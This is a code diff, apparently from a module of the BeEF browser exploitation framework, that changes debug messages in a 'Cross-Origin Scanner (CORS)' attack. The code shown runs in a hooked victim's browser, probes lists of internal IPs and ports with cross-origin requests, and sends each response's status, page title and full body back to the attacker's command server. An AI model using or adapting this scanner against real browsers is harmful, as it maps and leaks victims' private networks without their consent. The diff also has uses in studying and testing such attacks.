@@ -77,7 +77,7 @@ beef.execute(function() {
         clearInterval(timer);
         timer = null;
         var interval = (new Date).getTime() - start_scan;
-        beef.debug("[Cross-Origin Scanner] Worker queue is complete ["+interval+" ms]");
+        beef.debug("[Cross-Origin Scanner (CORS)] Worker queue is complete ["+interval+" ms]");
         return;
       }
     }
@@ -91,7 +91,7 @@ beef.execute(function() {
 
   }
 
-  beef.debug("[Cross-Origin Scanner] Starting CORS scan ("+(ips.length*ports.length)+" URLs / "+threads+" workers)");
+  beef.debug("[Cross-Origin Scanner (CORS)] Starting scan ("+(ips.length*ports.length)+" URLs / "+threads+" workers)");
 
   // create worker queue
   var workers = new Array();
@@ -105,10 +105,11 @@ beef.execute(function() {
     var worker = workers[i % threads];
     for (var p=0; p < ports.length; p++) {
       var url = proto + '://' + ips[i] + ':' + ports[p];
-      worker.queue('beef.net.cors.request(' +
+      worker.queue('beef.debug("[Cross-Origin Scanner (CORS)] Fetching URL: '+url+'");' +
+      'beef.net.cors.request(' +
       '"GET", "'+url+'", "", '+timeout+', function(response) {' +
        'if (response != null && response["status"] != 0) {' +
-        'beef.debug("[Cross-Origin Scanner] Received response from '+url+': " + JSON.stringify(response));' +
+        'beef.debug("[Cross-Origin Scanner (CORS)] Received response from '+url+': " + JSON.stringify(response));' +
         'var title = response["body"].match("<title>(.*?)<\\/title>"); if (title != null) title = title[1];' +
         'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response));' +
        '}' +
